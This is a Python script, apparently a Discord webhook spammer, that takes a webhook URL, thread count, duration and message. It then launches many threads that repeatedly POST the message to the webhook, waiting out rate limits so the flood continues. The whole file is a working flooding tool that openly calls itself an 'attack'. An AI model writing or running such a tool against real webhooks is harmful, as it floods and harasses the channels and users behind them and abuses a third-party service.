import requests

import threading
import socket
import random
import time
import sys
import os

try: # Check the arguments given with the command
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
    message = " ".join(sys.argv[4:])
    if message == "": # Check there was given a message
        print(f" [+] Command usage: python {sys.argv[0]} <target> <threads> <time> <message>!") # Print the correct command usage
        sys.exit() # Exit the code

except IndexError: # If one of the arguments were not given correctly
    print(f" [+] Command usage: python {sys.argv[0]} <target> <threads> <time> <message>!") # Print the correct command usage
    sys.exit() # Exit the code

timeout = time.time() + 1 * timer + 2

def attack(i): # The attack function getting ran by each of the threads
    time.sleep(2)
    try: # Catch any error that may occur
        while time.time() < timeout:

            response = requests.post( # Send the webhook message
                target,
                json = {"content" : message},
                params = {'wait' : True}
            )

            if response.status_code == 204 or response.status_code == 200: # Check if the message was sent
                print(f"[+] <Thread {i}> Message sent") # Tell the user the message was sent
            elif response.status_code == 429: # Check if it timed out
                print(f"[-] <Thread {i}> Rate limited ({response.json()['retry_after']}ms)") # Tell the user it got ratelimited and is waiting
                time.sleep(response.json()["retry_after"] / 1000) # Wait the time discord said we had to wait
            else: # if there is some other error
                print(f"[-] <Thread {i}> Error code: {response.status_code}") # Tell the user the error code

            time.sleep(.5) # Sleep to avoid spamming discord too much

        print(f"[!] Thread: {i} finished") # Tell the user when the thread finishes

        return # End the script once the loop is done
        sys.exit()

    except Exception as e: # Catch the errors and just ignore them
        print(e)

def start(): # Function to manage the attack
    print(" [+] Starting Attack..\n") # Let the user know its starting the attack
    time.sleep(2) # Sleep a bit to let the user read the message

    for i in range(0, threads): # Loop over the amount of threads the user wants to use
        print(f" [?] Starting thread {i}") # Let the user know a thread is starting
        threading.Thread(target = attack, args = (str(i))).start() # Start the thread with the attack function
        time.sleep(.25) # Wait a bit for dramatic effect

    print("") # Print a newline at the end

start()
